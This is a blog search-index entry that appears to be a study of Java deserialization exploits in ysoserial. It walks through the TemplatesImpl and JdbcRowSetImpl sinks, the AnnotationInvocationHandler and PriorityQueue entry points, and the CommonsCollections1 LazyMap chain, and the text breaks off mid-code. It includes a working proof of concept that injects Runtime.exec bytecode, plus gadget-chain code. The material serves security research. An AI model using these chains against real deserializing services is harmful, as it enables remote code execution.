<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Java Deserialize Vulnerabilities, ysoserial study</title>
    <link href="/2023/10/1726c701d497.html"/>
    <url>/2023/10/1726c701d497.html</url>
    
    <content type="html"><![CDATA[<h1 id="Sinks"><a href="#Sinks" class="headerlink" title="Sinks"></a>Sinks</h1><h2 id="TemplatesImpl-exploit"><a href="#TemplatesImpl-exploit" class="headerlink" title="TemplatesImpl exploit"></a>TemplatesImpl exploit</h2><blockquote><p>[!NOTE] Pre-requirements<br>Codes in this section are written with JDK7u21</p></blockquote><p><code>TemplatesImpl</code> provides a public approach to defining and instantiating classes from byte code.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransletClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;  <br>    TransletClassLoader(ClassLoader parent) &#123;  <br>        <span class="hljs-built_in">super</span>(parent);  <br>    &#125;  <br>   Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] b)</span> &#123;  <br>        <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>Backtracking, in <code>defineTransletClasses</code> method calls <code>TransletClassLoader.defineClass()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineTransletClasses</span><span class="hljs-params">()</span>  <br>    <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;  <br>  <br>    <span class="hljs-keyword">if</span> (_bytecodes == <span class="hljs-literal">null</span>) &#123;  <br>        <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);  <br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());  <br>    &#125;  <br>  <br>    <span class="hljs-type">TransletClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> (TransletClassLoader)  <br>        AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>() &#123;  <br>            <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;  <br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader());  <br>            &#125;  <br>        &#125;);  <br>  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">classCount</span> <span class="hljs-operator">=</span> _bytecodes.length;  <br>        _class = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[classCount];  <br>  <br>        <span class="hljs-keyword">if</span> (classCount &gt; <span class="hljs-number">1</span>) &#123;  <br>            _auxClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;  <br>            _class[i] = loader.defineClass(_bytecodes[i]);  <br>            <span class="hljs-keyword">final</span> <span class="hljs-type">Class</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> _class[i].getSuperclass();  <br>  <br>            <span class="hljs-comment">// Check if this is the main class  </span><br>            <span class="hljs-keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;  <br>                _transletIndex = i;  <br>            &#125;  <br>            <span class="hljs-keyword">else</span> &#123;  <br>                _auxClasses.put(_class[i].getName(), _class[i]);  <br>            &#125;  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">if</span> (_transletIndex &lt; <span class="hljs-number">0</span>) &#123;  <br>            ErrorMsg err= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());  <br>        &#125;  <br>    &#125;  <br>    <span class="hljs-keyword">catch</span> (ClassFormatError e) &#123;  <br>        <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);  <br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());  <br>    &#125;  <br>    <span class="hljs-keyword">catch</span> (LinkageError e) &#123;  <br>        <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);  <br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>There is a constraint that the superclass of the newly defined should be consistent with <code>AbstractTranslet</code>.</p><p>Backtracking, in <code>getTransletInstance</code> method, call <code>defineTransletClasses()</code> and instantiate the newly defined class:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Translet <span class="hljs-title function_">getTransletInstance</span><span class="hljs-params">()</span>  <br>    <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        <span class="hljs-keyword">if</span> (_name == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <br>  <br>        <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();  <br><br><span class="hljs-type">AbstractTranslet</span> <span class="hljs-variable">translet</span> <span class="hljs-operator">=</span> (AbstractTranslet)_class[_transletIndex].newInstance();  <br>        translet.postInitialization();  <br>        translet.setTemplates(<span class="hljs-built_in">this</span>);  <br>        translet.setServicesMechnism(_useServicesMechanism);  <br>        <span class="hljs-keyword">if</span> (_auxClasses != <span class="hljs-literal">null</span>) &#123;  <br>            translet.setAuxiliaryClasses(_auxClasses);  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">return</span> translet;  <br>    &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>In <code>newTransformer</code> method calls <code>getTransletInstance()</code> and it’s public so we can find its reference for further exploitation:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Transformer <span class="hljs-title function_">newTransformer</span><span class="hljs-params">()</span>  <br>    <span class="hljs-keyword">throws</span> TransformerConfigurationException  <br>&#123;  <br>    TransformerImpl transformer;  <br>  <br>    transformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,  <br>        _indentNumber, _tfactory);  <br>  <br>    <span class="hljs-keyword">if</span> (_uriResolver != <span class="hljs-literal">null</span>) &#123;  <br>        transformer.setURIResolver(_uriResolver);  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;  <br>        transformer.setSecureProcessing(<span class="hljs-literal">true</span>);  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> transformer;  <br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">templatesImplCls</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);  <br><span class="hljs-type">Class</span> <span class="hljs-variable">abstractTransletCls</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);  <br><span class="hljs-type">Class</span> <span class="hljs-variable">factoryCls</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&quot;</span>);  <br>  <br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();  <br>classPool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(Gadgets.StubTransletPayload.class));  <br>  <br><span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> classPool.get(Gadgets.StubTransletPayload.class.getName());  <br><span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;  <br>clazz.makeClassInitializer().insertAfter(cmd);  <br>  <br><span class="hljs-type">CtClass</span> <span class="hljs-variable">abstractTransletCtCls</span> <span class="hljs-operator">=</span> classPool.get(abstractTransletCls.getName());  <br>clazz.setSuperclass(abstractTransletCtCls);  <br><span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;payload&quot;</span> + System.nanoTime();  <br>clazz.setName(className);  <br>  <br><span class="hljs-type">byte</span>[] bytecode = clazz.toBytecode();<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> templatesImplCls.newInstance();  <br>Reflections.setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytecode, ClassFiles.classAsBytes(Gadgets.Foo.class)&#125;);  <br>Reflections.setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>);  <br>Reflections.setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, factoryCls.newInstance());  <br>  <br>((TemplatesImpl) templates).newTransformer();<br></code></pre></td></tr></table></figure><h2 id="JdbcRowSetImpl-exploit"><a href="#JdbcRowSetImpl-exploit" class="headerlink" title="JdbcRowSetImpl exploit"></a>JdbcRowSetImpl exploit</h2><blockquote><p>[!NOTE] pre-requirements<br>Reproduced on JDK1.8</p></blockquote><p>The method <code>connect()</code> of <code>JdbcRowSetImpl</code> can look up the JNDI URL stored in <code>databaseMetaData</code> property.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Connection <span class="hljs-title function_">connect</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><span class="hljs-keyword">if</span>(conn != <span class="hljs-literal">null</span>) &#123;  <br>    <span class="hljs-keyword">return</span> conn;  <br>  <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (getDataSourceName() != <span class="hljs-literal">null</span>) &#123;  <br>   ...<br><span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();  <br><span class="hljs-type">DataSource</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> (DataSource)ctx.lookup  <br>(getDataSourceName());<br>...<br>&#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Kick-offs"><a href="#Kick-offs" class="headerlink" title="Kick-offs"></a>Kick-offs</h1><h2 id="AnnotationInvocationHandler-exploit"><a href="#AnnotationInvocationHandler-exploit" class="headerlink" title="AnnotationInvocationHandler exploit"></a>AnnotationInvocationHandler exploit</h2><p>This class serves as a deserialization enter point.<br>In its deserialization process, <code>entrySet()</code> and <code>getValue()</code> method will be called on its <code>memberValues</code> member. The <code>entrySet()</code> can take effect associated with proxy([[Java Deserialize Vulnerabilities ysoserial study#Using TemplatesImpl (CB1 CB2)|example]]). The <code>getValue()</code> is widely used in CommonsCollections chain.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>  <br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;  <br>    ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">fields</span> <span class="hljs-operator">=</span> s.readFields();<br>    ...<br>    Map&lt;String, Object&gt; streamVals = (Map&lt;String,Object&gt;)fields.get(<span class="hljs-string">&quot;memberValues&quot;</span>, <span class="hljs-literal">null</span>);<br>...<br>    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;  <br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();  <br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br>    Class&lt;?&gt; memberType = memberTypes.get(name);  <br>    <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists  </span><br>        value = memberValue.getValue();  <br>        <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||  <br>              value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;  <br>            value = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(  <br>                        objectToString(value))  <br>                .setMember(annotationType.members().get(name));  <br>        &#125;  <br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="PriorityQueue-exploit"><a href="#PriorityQueue-exploit" class="headerlink" title="PriorityQueue exploit"></a>PriorityQueue exploit</h2><p>The <code>PriorityQueue</code> class is a deserialization enter point.<br>Combine it with a certain comparator(e.g. [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections2|TransformingComparator in CC2]], [[Java Deserialize Vulnerabilities ysoserial study#CommonsBeanutils|BeanComparator in CB1]]), the <code>compare()</code> method would be triggered in the deserialization process. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>  <br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>    ...<br>    heapify();<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)  <br>        siftDown(i, (E) queue[i]);  <br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDown</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;  <br>    <span class="hljs-keyword">if</span> (comparator != <span class="hljs-literal">null</span>)  <br>        siftDownUsingComparator(k, x);  <br>    <span class="hljs-keyword">else</span>        siftDownComparable(k, x);  <br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;  <br>    <span class="hljs-type">int</span> <span class="hljs-variable">half</span> <span class="hljs-operator">=</span> size &gt;&gt;&gt; <span class="hljs-number">1</span>;  <br>    <span class="hljs-keyword">while</span> (k &lt; half) &#123;  <br>        ...<br>        <span class="hljs-keyword">if</span> (right &lt; size &amp;&amp;  <br>            comparator.compare((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)  <br>            c = queue[child = right];  <br>        <span class="hljs-keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="hljs-number">0</span>)  <br>            <span class="hljs-keyword">break</span>;  <br>        ...<br>    &#125;  <br>    ...  <br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Chains"><a href="#Chains" class="headerlink" title="Chains"></a>Chains</h1><h2 id="CommonCollections"><a href="#CommonCollections" class="headerlink" title="CommonCollections"></a>CommonCollections</h2><h3 id="CommonCollections1"><a href="#CommonCollections1" class="headerlink" title="CommonCollections1"></a>CommonCollections1</h3><blockquote><p>[!NOTE] Pre-requirements<br>JDK &lt; 1.8 (Tested on JDK7u21, fail on JDK1.8)<br>commons-collections:commons-collections:3.2.1</p></blockquote><blockquote><p>[!NOTE]<br>There are main two variants of CC1, <code>LazyMap</code> or <code>TransformedMap</code></p></blockquote><h4 id="Using-LazyMap"><a href="#Using-LazyMap" class="headerlink" title="Using LazyMap"></a>Using <code>LazyMap</code></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Gadget chain:</span><br>ObjectInputStream.readObject()<br>AnnotationInvocationHandler.readObject()<br>Map(Proxy).entrySet()<br>AnnotationInvocationHandler.invoke()<br>LazyMap.get()<br>ChainedTransformer.transform()<br>ConstantTransformer.transform()<br>InvokerTransformer.transform()<br>Method.invoke()<br>Class.getMethod()<br>InvokerTransformer.transform()<br>Method.invoke()<br>Runtime.getRuntime()<br>InvokerTransformer.transform()<br>Method.invoke()<br>Runtime.exec()<br></code></pre></td></tr></table></figure><p>Use <code>AnnotationInvocationHandler</code> object(handler1) to trigger deserialize method <code>readObject</code>, it contains a dynamic proxy object for <code>Map</code> interface, another <code>AnnotationInvocationHandler</code> object(handler2) is contained in this <code>Proxy</code> object, handler2 contains a <code>LazyMap</code> armed with the evil transformer chain.<br>![[Pasted image 20231008190210.png|700]]</p><p>Firstly, when a deserialize procession is started, in handler1’s <code>readObject</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>  <br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;  <br>    ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">fields</span> <span class="hljs-operator">=</span> s.readFields();<br>    ...<br>    Map&lt;String, Object&gt; streamVals = (Map&lt;String,Object&gt;)fields.get(<span class="hljs-string">&quot;memberValues&quot;</span>, <span class="hljs-literal">null</span>);<br>...<br>    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;  <br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();  <br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br>    Class&lt;?&gt; memberType = memberTypes.get(name);  <br>    <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists  </span><br>        value = memberValue.getValue();  <br>        <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||  <br>              value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;  <br>            value = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(  <br>                        objectToString(value))  <br>                .setMember(annotationType.members().get(name));  <br>        &#125;  <br>    &#125;<br></code></pre></td></tr></table></figure><p>Obtain <code>memberValues</code>(which is a <code>Proxy</code>) and call <code>entrySet()</code> on it. The proxy will employ its <code>InvocationHandler</code> member to trigger <code>invoke()</code> method with <em>entrySet</em> method as one of parameters. In handler2’s <code>invoke()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;  <br>    <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>    ...<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);  <br><span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>)  <br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IncompleteAnnotationException</span>(type, member);<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>As for handler2, <code>memberValues</code> is a <code>LazyMap</code> object with evil transformer chain, when its <code>get</code> is called, since there is no key like <em>entrySet</em> in this empty map, the transformer chain will be triggered as code below presents:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// LazyMap.java</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;  <br>    <span class="hljs-comment">// create value for key if key is not currently in the map  </span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);  <br>        map.put(key, value);  <br>        <span class="hljs-keyword">return</span> value;  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> map.get(key);  <br>&#125;<br></code></pre></td></tr></table></figure><p>The evil transformer chain is usually presented as:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(  <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;);  <br><span class="hljs-comment">// real chain for after setup  </span><br><span class="hljs-keyword">final</span> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),  <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;  <br>        String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;  <br>        <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),  <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;  <br>        Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;  <br>        <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),  <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span 